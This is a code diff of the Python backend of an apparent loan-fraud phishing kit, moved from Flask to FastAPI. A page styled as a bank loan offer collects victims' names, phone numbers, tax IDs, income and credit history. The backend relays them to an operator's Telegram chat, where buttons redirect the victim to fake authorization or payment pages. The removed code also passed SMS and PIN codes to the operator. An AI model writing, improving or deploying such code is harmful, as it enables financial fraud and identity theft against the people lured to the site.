@@ -1,114 +1,160 @@
 import os
-import sqlite3
-import secrets
-import random
-import asyncio
+import logging
+from contextlib import asynccontextmanager
+from fastapi import FastAPI, HTTPException, Request
+from fastapi.middleware.cors import CORSMiddleware
+from pydantic import BaseModel
+import uvicorn
 import requests
-from flask import Flask, request, jsonify
-from flask_cors import CORS
-from aiogram import Bot, Dispatcher, types
-from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
 
-# ========== КОНФИГ ==========
-BOT_TOKEN = os.environ.get("BOT_TOKEN")
-ADMIN_CHAT_ID = int(os.environ.get("ADMIN_CHAT_ID", 0))
-SITE_URL = os.environ.get("SITE_URL", "https://alfakreditplus.warepointpay.ru/page_56637/")
+BOT_TOKEN = os.getenv("BOT_TOKEN")
+MY_CHAT_ID = os.getenv("MY_CHAT_ID")
+TELEGRAM_API_URL = f"https://api.telegram.org/bot{BOT_TOKEN}"
 
-# ========== БАЗА ДАННЫХ ==========
-def init_db():
-    conn = sqlite3.connect('applications.db')
-    c = conn.cursor()
-    c.execute('''CREATE TABLE IF NOT EXISTS applications
-                 (id INTEGER PRIMARY KEY, fullname TEXT, phone TEXT, inn TEXT,
-                  income REAL, term INTEGER, amount REAL, payment REAL,
-                  session_id TEXT, status TEXT, created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)''')
-    c.execute('''CREATE TABLE IF NOT EXISTS auth_sessions
-                 (session_id TEXT PRIMARY KEY, phone TEXT, sms_code TEXT, pin_code TEXT)''')
-    conn.commit()
-    conn.close()
+logging.basicConfig(level=logging.INFO)
 
-init_db()
+sessions = {}
 
-# ========== FLASK API ==========
-app = Flask(__name__)
-CORS(app)
+def send_to_telegram(chat_id: str, text: str, reply_markup: dict = None):
+    url = f"{TELEGRAM_API_URL}/sendMessage"
+    payload = {"chat_id": chat_id, "text": text, "parse_mode": "HTML"}
+    if reply_markup:
+        payload["reply_markup"] = reply_markup
+    try:
+        requests.post(url, json=payload, timeout=5)
+    except Exception as e:
+        logging.error(f"Ошибка отправки: {e}")
 
-def send_to_admin(text, keyboard=None):
-    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
-    data = {"chat_id": ADMIN_CHAT_ID, "text": text, "parse_mode": "HTML"}
-    if keyboard:
-        data["reply_markup"] = keyboard
-    requests.post(url, json=data)
+# ========== КЛАВИАТУРЫ ==========
+def get_application_keyboard(session_id: str):
+    return {
+        "inline_keyboard": [
+            [
+                {"text": "🔐 Авторизация", "callback_data": f"auth_{session_id}"},
+                {"text": "💳 Оплата", "callback_data": f"pay_{session_id}"}
+            ]
+        ]
+    }
 
-def get_keyboard(session_id):
-    return InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="🔐 Ссылка на авторизацию", callback_data=f"auth:{session_id}")],
-        [InlineKeyboardButton(text="💳 Ссылка на оплату", callback_data=f"payment:{session_id}")],
-        [InlineKeyboardButton(text="❌ Отклонить", callback_data=f"reject:{session_id}")]
-    ])
+# ========== МОДЕЛИ ==========
+class CreditApplicationData(BaseModel):
+    session_id: str
+    name: str
+    phone: str
+    inn: str = ""
+    income: float
+    months: int
+    amount: float
+    payment: float
+    user_chat_id: int = None
+    credit_history: str = None
 
-@app.route('/submit_credit_application', methods=['POST'])
-def submit_application():
-    data = request.json
-    session_id = secrets.token_hex(8)
+# ========== FASTAPI ==========
+@asynccontextmanager
+async def lifespan(app: FastAPI):
+    render_url = os.getenv("RENDER_EXTERNAL_URL", "https://telegram-bot-gateway-1.onrender.com")
+    webhook_url = f"{render_url}/webhook/callback"
+    requests.post(f"{TELEGRAM_API_URL}/setWebhook", json={"url": webhook_url})
+    send_to_telegram(MY_CHAT_ID, "🤖 *Бот запущен*")
+    yield
+    send_to_telegram(MY_CHAT_ID, "⚠️ Бот остановлен")
+
+app = FastAPI(lifespan=lifespan)
+
+app.add_middleware(
+    CORSMiddleware,
+    allow_origins=["*"],
+    allow_credentials=True,
+    allow_methods=["*"],
+    allow_headers=["*"],
+)
+
+# ========== ЗАЯВКА ==========
+@app.post("/submit_credit_application")
+async def submit_credit_application(data: CreditApplicationData):
+    sid = data.session_id
+    sessions[sid] = {
+        "name": data.name,
+        "phone": data.phone,
+        "inn": data.inn,
+        "income": data.income,
+        "months": data.months,
+        "amount": data.amount,
+        "payment": data.payment,
+        "user_chat_id": data.user_chat_id,
+        "credit_history": data.credit_history,
+        "status": "waiting_action"
+    }
     
-    conn = sqlite3.connect('applications.db')
-    c = conn.cursor()
-    c.execute('''INSERT INTO applications (fullname, phone, inn, income, term, amount, payment, session_id)
-                 VALUES (?, ?, ?, ?, ?, ?, ?, ?)''',
-              (data['fullname'], data['phone'], data.get('inn', ''), data['income'],
-               data['term'], data['amount'], data['payment'], session_id))
-    conn.commit()
-    conn.close()
-    
-    msg = f"🆕 <b>НОВАЯ ЗАЯВКА</b>\n\n👤 {data['fullname']}\n📱 {data['phone']}\n💰 {data['amount']} BYN\n📅 {data['term']} мес"
-    send_to_admin(msg, get_keyboard(session_id))
-    
-    return jsonify({"status": "ok", "session_id": session_id})
+    message = (
+        f"🏦 <b>НОВАЯ ЗАЯВКА НА ЗАЙМ</b>\n\n"
+        f"👤 <b>Клиент:</b> {data.name}\n"
+        f"📞 <b>Телефон:</b> {data.phone}\n"
+        f"🆔 <b>ИНН:</b> {data.inn if data.inn else '—'}\n"
+        f"📊 <b>Кредитная история:</b> {data.credit_history if data.credit_history else '—'}\n\n"
+        f"💰 <b>Сумма займа:</b> {data.amount:,.0f} BYN\n"
+        f"📅 <b>Срок:</b> {data.months} мес.\n\n"
+        f"🆔 <b>Сессия:</b> <code>{sid}</code>"
+    )
+    send_to_telegram(MY_CHAT_ID, message, reply_markup=get_application_keyboard(sid))
+    return {"status": "ok"}
 
-@app.route('/submit_phone', methods=['POST'])
-def submit_phone():
-    data = request.json
-    session_id = data['session_id']
-    phone = data['phone']
-    sms_code = str(random.randint(10000, 99999))
-    pin_code = str(random.randint(1000, 9999))
+# ========== ПРОВЕРКА ДЕЙСТВИЯ ДЛЯ СТРАНИЦЫ ==========
+@app.get("/check_action_status/{session_id}")
+async def check_action_status(session_id: str):
+    session = sessions.get(session_id)
+    if not session:
+        return {"status": "not_found"}
     
-    conn = sqlite3.connect('applications.db')
-    c = conn.cursor()
-    c.execute('INSERT OR REPLACE INTO auth_sessions (session_id, phone, sms_code, pin_code) VALUES (?, ?, ?, ?)',
-              (session_id, phone, sms_code, pin_code))
-    conn.commit()
-    conn.close()
+    action = session.get("pending_action", None)
+    if action:
+        session["pending_action"] = None
+        return {"action": action}
+    return {"action": None}
+
+# ========== ОБРАБОТКА КНОПОК ==========
+@app.post("/webhook/callback")
+async def handle_callback(request: Request):
+    data = await request.json()
     
-    send_to_admin(f"📱 ЗАПРОС АВТОРИЗАЦИИ\n\nСессия: {session_id}\nТелефон: {phone}\n\nSMS: {sms_code}\nPIN: {pin_code}")
-    return jsonify({"status": "ok"})
-
-@app.route('/submit_code', methods=['POST'])
-def submit_code():
-    data = request.json
-    conn = sqlite3.connect('applications.db')
-    c = conn.cursor()
-    c.execute('SELECT sms_code FROM auth_sessions WHERE session_id = ?', (data['session_id'],))
-    row = c.fetchone()
-    conn.close()
-    if row and row[0] == data['code']:
-        return jsonify({"status": "ok", "next_step": "pin"})
-    return jsonify({"status": "error", "message": "Неверный код"})
-
-@app.route('/submit_pin', methods=['POST'])
-def submit_pin():
-    data = request.json
-    conn = sqlite3.connect('applications.db')
-    c = conn.cursor()
-    c.execute('SELECT pin_code FROM auth_sessions WHERE session_id = ?', (data['session_id'],))
-    row = c.fetchone()
-    conn.close()
-    if row and row[0] == data['pin']:
-        send_to_admin(f"✅ АВТОРИЗАЦИЯ УСПЕШНА!\n\nСессия: {data['session_id']}")
-        return jsonify({"status": "ok", "authorized": True})
-    return jsonify({"status": "error", "message": "Неверный PIN"})
+    if "callback_query" not in data:
+        return {"ok": True}
+    
+    callback = data["callback_query"]
+    callback_id = callback["id"]
+    data_str = callback["data"]
+    
+    parts = data_str.split("_")
+    if len(parts) < 2:
+        return {"ok": True}
+    
+    action = parts[0]
+    session_id = "_".join(parts[1:]) if len(parts) > 2 else parts[1]
+    
+    session = sessions.get(session_id)
+    
+    # Кнопка "Авторизация"
+    if action == "auth":
+        if session:
+            session["pending_action"] = "auth"
+        send_to_telegram(MY_CHAT_ID, f"🔐 Команда auth для сессии {session_id}")
+        requests.post(
+            f"{TELEGRAM_API_URL}/answerCallbackQuery",
+            json={"callback_query_id": callback_id, "text": "Страница будет перенаправлена"}
+        )
+    
+    # Кнопка "Оплата"
+    elif action == "pay":
+        if session:
+            session["pending_action"] = "pay"
+        send_to_telegram(MY_CHAT_ID, f"💳 Команда pay для сессии {session_id}")
+        requests.post(
+            f"{TELEGRAM_API_URL}/answerCallbackQuery",
+            json={"callback_query_id": callback_id, "text": "Страница будет перенаправлена"}
+        )
+    
+    return {"ok": True}
 
 if __name__ == "__main__":
-    port = int(os.environ.get("PORT", 5000))
-    app.run(host='0.0.0.0', port=port)
+    port = int(os.getenv("PORT", 8000))
+    uvicorn.run(app, host="0.0.0.0", port=port)
